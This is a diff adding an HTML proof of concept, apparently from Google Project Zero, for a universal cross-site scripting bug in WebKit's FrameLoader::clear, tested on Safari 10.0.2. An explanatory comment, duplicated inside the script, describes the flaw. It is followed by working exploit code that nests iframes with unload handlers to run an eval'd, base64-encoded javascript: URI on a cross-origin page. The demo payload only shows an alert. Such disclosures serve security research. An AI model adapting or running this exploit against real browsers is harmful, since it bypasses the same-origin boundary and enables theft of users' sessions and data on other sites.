@@ -1,0 +1,111 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1049
+
+When the new page is loading, FrameLoader::clear is called to clear the old document and window.
+
+Here's a snippet of FrameLoader::clear.
+
+void FrameLoader::clear(Document* newDocument, bool clearWindowProperties, bool clearScriptObjects, bool clearFrameView)
+{
+    ...
+    // Do this after detaching the document so that the unload event works.
+    if (clearWindowProperties) {
+        InspectorInstrumentation::frameWindowDiscarded(m_frame, m_frame.document()->domWindow());
+        m_frame.document()->domWindow()->resetUnlessSuspendedForDocumentSuspension();
+        m_frame.script().clearWindowShell(newDocument->domWindow(), m_frame.document()->pageCacheState() == Document::AboutToEnterPageCache); <<-------- (1)
+
+        if (shouldClearWindowName(m_frame, *newDocument))
+            m_frame.tree().setName(nullAtom);
+    }
+
+    ...
+    m_frame.setDocument(nullptr); <<-------- (2)
+    ...
+}
+
+The new document's window is attached at (1) before calling |m_frame.setDocument(nullptr)| that calls unload event handlers. So in the unload event handler, we could execute arbitrary javascript code on new document's window with a javascript: URI.
+
+
+Tested on Safari 10.0.2(12602.3.12.0.1).
+-->
+
+<body>
+<script>
+
+/*
+
+Apple WebKit: UXSS via FrameLoader::clear
+
+When the new page is loading, FrameLoader::clear is called to clear the old document and window.
+
+Here's a snippet of FrameLoader::clear.
+
+void FrameLoader::clear(Document* newDocument, bool clearWindowProperties, bool clearScriptObjects, bool clearFrameView)
+{
+    ...
+    // Do this after detaching the document so that the unload event works.
+    if (clearWindowProperties) {
+        InspectorInstrumentation::frameWindowDiscarded(m_frame, m_frame.document()->domWindow());
+        m_frame.document()->domWindow()->resetUnlessSuspendedForDocumentSuspension();
+        m_frame.script().clearWindowShell(newDocument->domWindow(), m_frame.document()->pageCacheState() == Document::AboutToEnterPageCache); <<-------- (1)
+
+        if (shouldClearWindowName(m_frame, *newDocument))
+            m_frame.tree().setName(nullAtom);
+    }
+
+    ...
+    m_frame.setDocument(nullptr); <<-------- (2)
+    ...
+}
+
+The new document's window is attached at (1) before calling |m_frame.setDocument(nullptr)| that calls unload event handlers. So in the unload event handler, we could execute arbitrary javascript code on new document's window with a javascript: URI.
+
+
+Tested on Safari 10.0.2(12602.3.12.0.1).
+*/
+
+"use strict";
+
+function log(txt) {
+    //if (Array.isArray(txt))
+    //    txt = Array.prototype.join.call(txt, ", ");
+
+    let c = document.createElement("div");
+    c.innerText = "log: " + txt;
+    d.appendChild(c);
+}
+
+function main() {
+    let f = document.body.appendChild(document.createElement("iframe"));
+    
+    let a = f.contentDocument.documentElement.appendChild(document.createElement("iframe"));
+    a.contentWindow.onunload = () => {
+        let b = f.contentDocument.documentElement.appendChild(document.createElement("iframe"));
+        b.contentWindow.onunload = () => {
+            f.src = "javascript:''";
+
+            let c = f.contentDocument.documentElement.appendChild(document.createElement("iframe"));
+            c.contentWindow.onunload = () => {
+                f.src = "javascript:''";
+
+                let d = f.contentDocument.appendChild(document.createElement("iframe"));
+                d.contentWindow.onunload = () => {
+                    f.src = "javascript:setTimeout(eval(atob('" + btoa("(" +function () {
+                        alert(document.location);
+                    } + ")") + "')), 0);";
+                };
+            };
+        };
+    };
+
+    f.src = "https://abc.xyz/";
+}
+
+main();
+
+/*
+b JSC::globalFuncParseFloat
+
+*/
+</script>
+</body>
